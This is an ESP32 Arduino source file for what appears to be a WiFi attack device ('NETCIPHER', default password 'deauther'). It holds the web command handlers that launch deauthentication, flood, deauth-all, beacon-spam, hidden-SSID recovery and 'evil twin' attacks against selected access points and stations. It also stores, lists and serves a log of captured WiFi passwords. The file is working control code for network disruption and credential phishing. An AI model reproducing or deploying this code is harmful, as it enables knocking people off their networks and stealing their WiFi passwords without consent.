void handleWebCommand() {

    lastActivityTime = millis();
    
    if (!webServer.hasArg("cmd")) {
        webServer.send(400, "text/plain", "Missing command");
        return;
    }
    
    String cmd = webServer.arg("cmd");
    
    // Handle AP selection by BSSID
    if (cmd.startsWith("SELECT_AP_BSSID_")) {
        String bssid = cmd.substring(16);
        
        bool found = false;
        for (int i = 0; i < MAX_TARGETS; i++) {
            if (_networks[i].ch > 0) {
                String currentBSSID = bytesToStr(_networks[i].bssid, 6);
                if (currentBSSID == bssid) {
                    _networks[i].selected = !_networks[i].selected;
                    found = true;
                    break;
                }
            }
        }
        
        if (found) {
            webServer.send(200, "text/plain", "OK");
        } else {
            webServer.send(400, "text/plain", "Invalid BSSID");
        }
        return;
    }
    
    // Handle Station selection by MAC address
if (cmd.startsWith("SELECT_STA_MAC_")) {
    String mac = cmd.substring(15);
    
    // Convert the incoming MAC string to raw bytes for comparison
    uint8_t targetMac[6];
    if (sscanf(mac.c_str(), "%02X:%02X:%02X:%02X:%02X:%02X",
               &targetMac[0], &targetMac[1], &targetMac[2],
               &targetMac[3], &targetMac[4], &targetMac[5]) != 6) {
        webServer.send(400, "text/plain", "Invalid MAC format");
        return;
    }
    
    bool found = false;
    for (int i = 0; i < scannedStationCount; i++) {
        // Compare raw bytes directly
        if (memcmp(scannedStationMAC[i], targetMac, 6) == 0) {
            stationSelected[i] = !stationSelected[i];
            found = true;
            break;
        }
    }
    
    if (found) {
        webServer.send(200, "text/plain", "OK");
    } else {
        webServer.send(400, "text/plain", "Invalid MAC");
    }
    return;
}
    
    // Handle scan commands
    if (cmd == "SCAN_NETWORKS") {
        WiFi.mode(WIFI_AP_STA);  
        performScan();
        scanInProgress = true;
       
        webServer.send(200, "text/plain", "OK");
        return;
    }
    
    if (cmd == "SCAN_STATIONS") {
        if (hasSelectedTargets()) {
            startStationScan();
            webServer.send(200, "text/plain", "OK");
        } else {
            webServer.send(400, "text/plain", "No APs selected");
        }
        return;
    }
    
    // Handle selection commands
    if (cmd == "SELECT_ALL_APS") {
        for (int i = 0; i < MAX_TARGETS; i++) {
            if (_networks[i].ch > 0) _networks[i].selected = true;
        }
        webServer.send(200, "text/plain", "OK");
        return;
    }
    
    if (cmd == "CLEAR_ALL_APS") {
        for (int i = 0; i < MAX_TARGETS; i++) {
            _networks[i].selected = false;
        }
        webServer.send(200, "text/plain", "OK");
        return;
    }
    
    if (cmd == "SELECT_ALL_STATIONS") {
        for (int i = 0; i < scannedStationCount; i++) {
            stationSelected[i] = true;
        }
        webServer.send(200, "text/plain", "OK");
        return;
    }
    
    if (cmd == "CLEAR_ALL_STATIONS") {
        for (int i = 0; i < scannedStationCount; i++) {
            stationSelected[i] = false;
        }
        webServer.send(200, "text/plain", "OK");
        return;
    }

    // Add this after your other commands
// Add DELETE_ALL_LOGS command
    // Handle DELETE ALL LOGS
    if (cmd == "DELETE_ALL_LOGS") {
        if (LittleFS.exists(LOG_FILE)) {
            LittleFS.remove(LOG_FILE);
        }
        passwordLogCount = 0;
        File file = LittleFS.open(LOG_FILE, "w");
        if (file) file.close();
        webServer.send(200, "text/plain", "OK");
        return;
    }
    
    // Handle DELETE SELECTED LOGS
    if (cmd.startsWith("DELETE_SELECTED_LOGS:")) {
        String indicesStr = cmd.substring(20);
        
        // Parse indices
        int toDelete[50];
        int deleteCount = 0;
        
        int pos = 0;
        while (pos < indicesStr.length() && deleteCount < 50) {
            int comma = indicesStr.indexOf(',', pos);
            String idxStr;
            if (comma == -1) {
                idxStr = indicesStr.substring(pos);
                pos = indicesStr.length();
            } else {
                idxStr = indicesStr.substring(pos, comma);
                pos = comma + 1;
            }
            
            int idx = idxStr.toInt();
            if (idx >= 0 && idx < passwordLogCount) {
                toDelete[deleteCount] = idx;
                deleteCount++;
            }
        }
        
        if (deleteCount > 0) {
            PasswordLogEntry temp[MAX_PASSWORD_LOGS];
            int newCount = 0;
            
            for (int i = 0; i < passwordLogCount; i++) {
                bool shouldDelete = false;
                for (int j = 0; j < deleteCount; j++) {
                    if (i == toDelete[j]) {
                        shouldDelete = true;
                        break;
                    }
                }
                if (!shouldDelete) {
                    temp[newCount] = passwordLogs[i];
                    newCount++;
                }
            }
            
            for (int i = 0; i < newCount; i++) {
                passwordLogs[i] = temp[i];
            }
            passwordLogCount = newCount;
            
            LittleFS.remove(LOG_FILE);
            File file = LittleFS.open(LOG_FILE, "w");
            if (file) {
                for (int i = 0; i < passwordLogCount; i++) {
                    file.println(passwordLogs[i].ssid + "|" + 
                                passwordLogs[i].bssid + "|" + 
                                passwordLogs[i].password + "|" + 
                                (passwordLogs[i].verified ? "1" : "0"));
                }
                file.close();
            }
        }
        
        webServer.send(200, "text/plain", "OK");
        return;
    }
    
    // Handle attack commands
    if (cmd == "DEAUTH") {
    if (hasSelectedTargets() || getSelectedStationCount() > 0) {
        // Just set the flag and respond immediately - don't do heavy operations here
        pendingWebCommand = "DEAUTH";
        lastWebCommandTime = millis();
        webServer.send(200, "text/plain", "OK");
    } else {
        webServer.send(400, "text/plain", "No targets or stations selected");
    }
    return;
}

    if (cmd == "REACTIVE") {
    if (!reactiveDeauthActive) {
        if (hasSelectedTargets()) {
            startReactiveDeauth();
            webServer.send(200, "text/plain", "OK");
        } else {
            webServer.send(400, "text/plain", "No AP selected");
        }
    } else {
        stopReactiveDeauth();
        webServer.send(200, "text/plain", "OK");
    }
    return;
}

if (cmd == "EVIL_TWIN") {
    if (!hotspot_active) {
        startEvilTwin();
        webServer.send(200, "text/plain", "OK");
    } else {
        stopEvilTwin();
        webServer.send(200, "text/plain", "OK");
    }
    return;
}
    
    if (cmd == "FLOOD") {
        if (!flood_active) {
            
            if (hasSelectedTargets()) {
             lastActivityTime = millis();   
                apDeauthActive = false;
                stationDeauthActive = false;
                deauthAllActive = false;
                beaconSpam.stop();
                if (deauthMonitorActive) stopDeauthMonitor();
                if (isScanningStations) stopStationScan();
                if (hiddenRecoveryActive) stopHiddenRecovery();
                
                flood_active = true;
                flood_packet_count = 0;
                
                esp_wifi_set_mode(WIFI_MODE_AP);
                esp_wifi_start();
                currentScreen = SCREEN_DEAUTH_FLOOD;
                webServer.send(200, "text/plain", "OK");
            } else {
                webServer.send(400, "text/plain", "No targets");
            }
        } else {
            flood_active = false;
            
            currentScreen = SCREEN_MAIN;
            webServer.send(200, "text/plain", "OK");
        }
        return;
    }
    
    if (cmd == "DEAUTH_MON") {
        if (!deauthMonitorActive) {
            lastActivityTime = millis();
            apDeauthActive = false;
            stationDeauthActive = false;
            flood_active = false;
            deauthAllActive = false;
            beaconSpam.stop();
            if (isScanningStations) stopStationScan();
            if (hiddenRecoveryActive) stopHiddenRecovery();
            
            
             performDeauthMonitorSyncScan();
            
            webServer.send(200, "text/plain", "OK");
        } else {
            stopDeauthMonitor();
            currentScreen = SCREEN_MAIN;
            webServer.send(200, "text/plain", "OK");
        }
        return;
    }
    
    if (cmd == "DEAUTH_ALL") {
    
    scanDeauthAllNetworks();  // This now just scans and sets screen
    esp_wifi_set_mode(WIFI_MODE_AP);
    esp_wifi_start();
    webServer.send(200, "text/plain", "OK");
    return;
   }
    
    if (cmd == "BEACON_SPAM") {
    if (!beaconSpam.running) {
        lastActivityTime = millis();
        stopAllAttacks();
        beaconSpam.begin();
        beaconSpam.start();
        webServer.send(200, "text/plain", "OK");
    } else {
        beaconSpam.stop();
        webServer.send(200, "text/plain", "OK");
    }
    return;
}
    if (cmd == "RECOVER_SSID") {
        if (hasSelectedTargets()) {
            lastActivityTime = millis();
            bool found = false;
            for (int i = 0; i < MAX_TARGETS; i++) {
                if (_networks[i].selected && _networks[i].ssid.length() == 0) {
                    memcpy(hiddenTargetBSSID, _networks[i].bssid, 6);
                    hiddenTargetChannel = _networks[i].ch;
                    startHiddenRecovery();
                    found = true;
                    break;
                }
            }
            if (found) {
                webServer.send(200, "text/plain", "OK");
            } else {
                webServer.send(400, "text/plain", "No hidden AP");
            }
        } else {
            webServer.send(400, "text/plain", "No targets");
        }
        return;
    }
    
    if (cmd == "REBOOT") {
        webServer.send(200, "text/plain", "OK");
        delay(100);
        performReboot();
        return;
    }
    
    if (cmd == "SLEEP") {
        webServer.send(200, "text/plain", "OK");
        delay(100);
        performDeepSleep();
        return;
    }
    
    // Virtual button commands
    if (cmd == "BTN_UP")   { vBtn_UP   = true; webServer.send(200, "text/plain", "OK"); return; }
    if (cmd == "BTN_DOWN") { vBtn_DOWN = true; webServer.send(200, "text/plain", "OK"); return; }
    if (cmd == "BTN_OK")   { vBtn_OK   = true; webServer.send(200, "text/plain", "OK"); return; }
    if (cmd == "BTN_BACK") { vBtn_BACK = true; webServer.send(200, "text/plain", "OK"); return; }

    webServer.send(400, "text/plain", "Unknown command");
}

void handleMac() {
    String response = "{";
    response += "\"ap_mac\":\"" + WiFi.softAPmacAddress() + "\",";
    response += "\"sta_mac\":\"" + WiFi.macAddress() + "\"";
    response += "}";
    webServer.send(200, "application/json", response);
}

void handleWebStatus() {
    String response = "{";

    // Attack states
    response += "\"deauthActive\":" + String(combinedDeauthActive ? 1 : 0) + ",";
    response += "\"evilTwinActive\":" + String(hotspot_active ? 1 : 0) + ",";
    response += "\"floodActive\":" + String(flood_active ? 1 : 0) + ",";
    response += "\"deauthMonActive\":" + String(deauthMonitorActive ? 1 : 0) + ",";
    response += "\"deauthAllActive\":" + String(deauthAllActive ? 1 : 0) + ",";
    response += "\"reactiveActive\":" + String(reactiveDeauthActive ? 1 : 0) + ",";
    response += "\"beaconSpamActive\":" + String(beaconSpam.running ? 1 : 0) + ",";
    response += "\"recoverSsidActive\":" + String(hiddenRecoveryActive ? 1 : 0) + ",";

    // Targets array (APs)
    response += "\"targets\":[";
    bool firstTarget = true;
    for (int i = 0; i < MAX_TARGETS; i++) {
        if (_networks[i].ch > 0) {
            if (!firstTarget) response += ",";
            firstTarget = false;
            response += "{";
            response += "\"ssid\":\"" + _networks[i].ssid + "\",";
            response += "\"ch\":" + String(_networks[i].ch) + ",";
            response += "\"bssid\":\"" + bytesToStr(_networks[i].bssid, 6) + "\",";
            response += "\"selected\":" + String(_networks[i].selected ? 1 : 0) + ",";
            response += "\"rssi\":" + String(_networks[i].rssi);
            response += "}";
        }
    }
    response += "],";

    // Stations array using raw byte arrays
    response += "\"stations\":[";
    firstTarget = true;
    for (int i = 0; i < scannedStationCount; i++) {
        if (!firstTarget) response += ",";
        firstTarget = false;

        // Convert raw station MAC to string
        char macStr[18];
        snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
                 scannedStationMAC[i][0], scannedStationMAC[i][1],
                 scannedStationMAC[i][2], scannedStationMAC[i][3],
                 scannedStationMAC[i][4], scannedStationMAC[i][5]);

        // Convert raw AP BSSID to string
        char bssidStr[18];
        snprintf(bssidStr, sizeof(bssidStr), "%02X:%02X:%02X:%02X:%02X:%02X",
                 stationAPBSSIDRaw[i][0], stationAPBSSIDRaw[i][1],
                 stationAPBSSIDRaw[i][2], stationAPBSSIDRaw[i][3],
                 stationAPBSSIDRaw[i][4], stationAPBSSIDRaw[i][5]);

        response += "{";
        response += "\"mac\":\"" + String(macStr) + "\",";
        response += "\"ap\":\"" + stationNetworkSSID[i] + "\",";
        response += "\"ap_bssid\":\"" + String(bssidStr) + "\",";
        response += "\"ap_channel\":" + String(stationAPChannel[i]) + ",";
        response += "\"selected\":" + String(stationSelected[i] ? 1 : 0);
        response += "}";
    }
    response += "],";

    // Logs array (unchanged)
    response += "\"logs\":[";
    firstTarget = true;
    for (int i = 0; i < passwordLogCount; i++) {
        if (!firstTarget) response += ",";
        firstTarget = false;
        response += "{";
        response += "\"ssid\":\"" + passwordLogs[i].ssid + "\",";
        response += "\"password\":\"" + passwordLogs[i].password + "\",";
        response += "\"verified\":" + String(passwordLogs[i].verified ? 1 : 0);
        response += "}";
    }
    response += "]";

    response += "}";
    webServer.send(200, "application/json", response);
}

void handleTimeSync() {
    if (webServer.hasArg("time")) {
        int year, month, day, hour, minute, second;
        sscanf(webServer.arg("time").c_str(), "%d-%d-%d %d:%d:%d", &year, &month, &day, &hour, &minute, &second);
        char dateStr[20], timeStr[20];
        snprintf(dateStr, sizeof(dateStr), "%02d/%02d/%02d", day, month, year % 100);
        snprintf(timeStr, sizeof(timeStr), "%02d:%02d:%02d", hour, minute, second);
        syncedDate = String(dateStr);
        syncedTime = String(timeStr);
        timeSynced = true;
        lastTimeSync = millis();
        webServer.send(200, "text/plain", "OK");
    } else {
        webServer.send(400, "text/plain", "Missing time");
    }
}
void handleAdmin() {
    webServer.send(200, "text/html", ADMIN_HTML);
}


void deleteAllLogs() {
    if (LittleFS.exists(LOG_FILE)) {
        LittleFS.remove(LOG_FILE);
    }
    
    passwordLogCount = 0;
    
    // Create empty file
    File file = LittleFS.open(LOG_FILE, "w");
    if (file) {
        file.close();
    }
    
    Serial.println("All logs deleted");
}
void stopAccessPoint() {
    if (apAndWebRunning) {
        webServer.stop();
        dnsServer.stop();
        WiFi.softAPdisconnect(true);
        apAndWebRunning = false;
        webServerRunning = false;
    }
}

// AP Settings file in LittleFS
#define AP_SETTINGS_FILE "/ap_settings.json"

// Save AP settings to LittleFS
void saveAPSettings(String apName, String apPassword) {
    if (apName.length() > 32) apName = apName.substring(0, 32);
    if (apPassword.length() > 32) apPassword = apPassword.substring(0, 32);
    
    StaticJsonDocument<256> doc;
    doc["apName"] = apName;
    doc["apPassword"] = apPassword;
    
    if (LittleFS.exists(AP_SETTINGS_FILE)) {
        LittleFS.remove(AP_SETTINGS_FILE);
    }
    
    File file = LittleFS.open(AP_SETTINGS_FILE, "w");
    if (!file) {
        Serial.println("Failed to open AP settings file for writing");
        return;
    }
    
    serializeJson(doc, file);
    file.close();
    Serial.println("AP settings saved to LittleFS");
}

// Load AP settings from LittleFS
void loadAPSettings(String &apName, String &apPassword) {
    apName = "NETCIPHER";  // Default values
    apPassword = "deauther";
    
    if (!LittleFS.exists(AP_SETTINGS_FILE)) {
        Serial.println("AP settings file not found, using defaults");
        return;
    }
    
    File file = LittleFS.open(AP_SETTINGS_FILE, "r");
    if (!file) {
        Serial.println("Failed to open AP settings file for reading");
        return;
    }
    
    StaticJsonDocument<256> doc;
    DeserializationError error = deserializeJson(doc, file);
    file.close();
    
    if (error) {
        Serial.println("Failed to parse AP settings JSON");
        return;
    }
    
    if (doc.containsKey("apName") && doc["apName"].is<const char*>()) {
        apName = String((const char*)doc["apName"]);
    }
    if (doc.containsKey("apPassword") && doc["apPassword"].is<const char*>()) {
        apPassword = String((const char*)doc["apPassword"]);
    }
    
    Serial.print("AP settings loaded: ");
    Serial.print(apName);
    Serial.print(" / ");
    Serial.println(apPassword);
}

// Handler for GET /get-ap-settings
void handleGetAPSettings() {
    String apName, apPassword;
    loadAPSettings(apName, apPassword);
    
    StaticJsonDocument<256> doc;
    doc["apName"] = apName;
    doc["apPassword"] = apPassword;
    
    String response;
    serializeJson(doc, response);
    
    webServer.send(200, "application/json", response);
}

// Handler for POST /update-netcipher
void handleUpdateAPSettings() {
    if (!webServer.hasArg("apName") || !webServer.hasArg("apPassword")) {
        webServer.send(400, "text/plain", "Missing apName or apPassword");
        return;
    }
    
    String apName = webServer.arg("apName");
    String apPassword = webServer.arg("apPassword");
    
    // Validate input
    if (apName.length() == 0 || apName.length() > 32) {
        webServer.send(400, "text/plain", "Invalid AP name length (1-32)");
        return;
    }
    
    if (apPassword.length() < 8 || apPassword.length() > 32) {
        webServer.send(400, "text/plain", "Invalid password length (8-32)");
        return;
    }
    
    // Save the new settings
    saveAPSettings(apName, apPassword);
    
    webServer.send(200, "text/plain", "Settings saved. Restarting AP...");
    
    // Restart the AP after a short delay
    delay(500);
    startAccessPoint();
}

void startAccessPoint() {
    // Load AP settings from LittleFS
    String apName, apPassword;
    loadAPSettings(apName, apPassword);
    
    // Stop/reset WiFi
    WiFi.disconnect(true);
    WiFi.mode(WIFI_OFF);
    delay(100);
    WiFi.mode(WIFI_AP);
    esp_wifi_start();
    delay(100);
    
    // 1. Reserve the gateway IP (192.168.4.1) for the ESP32
    //    and tell DHCP to start counting from 192.168.4.2
    WiFi.softAPConfig(apIP, apIP, IPAddress(255,255,255,0));
    
    // 2. Start AP with configured name and password
    WiFi.softAP(apName.c_str(), apPassword.c_str());
    
    // 3. Keep DNS running
    dnsServer.start(DNS_PORT, "*", apIP);
    setupWebServer();
    
    apAndWebRunning = true;
    webServerRunning = true;
    Serial.print("AP IP: "); Serial.println(WiFi.softAPIP());
    Serial.print("AP SSID: "); Serial.println(apName);
}